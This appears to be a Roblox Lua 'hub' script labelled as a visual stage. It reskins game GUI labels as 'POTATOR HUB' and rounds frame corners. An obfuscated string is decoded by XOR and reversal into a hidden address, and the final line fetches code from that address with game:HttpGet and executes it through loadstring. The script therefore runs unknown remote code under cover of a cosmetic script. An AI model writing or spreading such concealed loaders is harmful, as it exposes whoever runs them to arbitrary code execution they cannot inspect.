
--[[ STAGE 2: VISUAL CORE ]]
local rGBhGCzPvh9tLxKIj5I="\033\054\046\241\042\039\250\254\041\255\044\196\043\050\049\001\005\000\037\050\198\052\010\007\001\011\061\046\059\010\007\032\063\021\016\008\016\014\057\006\027\015\016\020\030\018\022\002\015\004\008\018\103\103\027\105\029\029\108\112\009\044\108\104\097\110\049\111\112\102\125\114\107\114\124\109\059\113\065\125\113\126\119\064\117\067\069\069\007\070\073\126\010\081\076\068\084\079\081\070\086\074\089\092\074\094\082\095\085\084\028\166\081\163\097\098\110\168\166\171\172\161"local eiRR8KDH9eE6qA7prg=32 local djShcV_fl5UxDnXJRA=150 local ZCvoZq1rGDerKN=1 local ezWQyADLmvKM=1 local k60Elm7qTwV2s=9 local k65u729LDEw7=true local ogDYEPYbWSz9=bit32 and bit32.bxor if not ogDYEPYbWSz9 then ogDYEPYbWSz9=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local zpxv9iGHje8I4vvCxE35={}for QU3euWY3ljyN=1,#rGBhGCzPvh9tLxKIj5I do local kZ0cQPymVgyPa=string.byte(rGBhGCzPvh9tLxKIj5I,QU3euWY3ljyN)local esRrvEpJIdJmdqvEGudHED=(djShcV_fl5UxDnXJRA+(QU3euWY3ljyN*ezWQyADLmvKM)+k60Elm7qTwV2s)%256 if ZCvoZq1rGDerKN==0 then kZ0cQPymVgyPa=(kZ0cQPymVgyPa-esRrvEpJIdJmdqvEGudHED)%256 zpxv9iGHje8I4vvCxE35[QU3euWY3ljyN]=string.char(ogDYEPYbWSz9(kZ0cQPymVgyPa,eiRR8KDH9eE6qA7prg))else kZ0cQPymVgyPa=ogDYEPYbWSz9(kZ0cQPymVgyPa,eiRR8KDH9eE6qA7prg)zpxv9iGHje8I4vvCxE35[QU3euWY3ljyN]=string.char((kZ0cQPymVgyPa-esRrvEpJIdJmdqvEGudHED)%256)end end local DEK6AZTWYscIS=table.concat(zpxv9iGHje8I4vvCxE35)if k65u729LDEw7 then DEK6AZTWYscIS=string.reverse(DEK6AZTWYscIS)end local ZXuYMz6lqlvwPlooqEfbY=DEK6AZTWYscIS
local HubName = "POTATOR HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(ZXuYMz6lqlvwPlooqEfbY))()
